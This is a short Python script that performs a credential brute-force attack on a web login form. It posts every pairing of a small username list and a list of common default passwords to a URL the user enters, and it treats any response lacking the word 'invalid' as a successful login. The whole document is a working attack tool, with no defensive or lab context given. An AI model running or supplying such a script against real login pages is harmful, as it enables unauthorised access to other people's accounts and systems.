import requests

def brute_force(url, username_list, password_list):
    for username in username_list:
        for password in password_list:
            response = requests.post(url, data={'username': username, 'password': password})
            if "invalid" not in response.text.lower():
                print(f"[+] Valid credentials found: {username} / {password}")
                return
    print("[-] No valid credentials found.")

if __name__ == "__main__":
    url = input("Enter login URL: ").strip()
    usernames = ["admin", "user"]
    passwords = ["1234", "admin", "password"]
    brute_force(url, usernames, passwords)
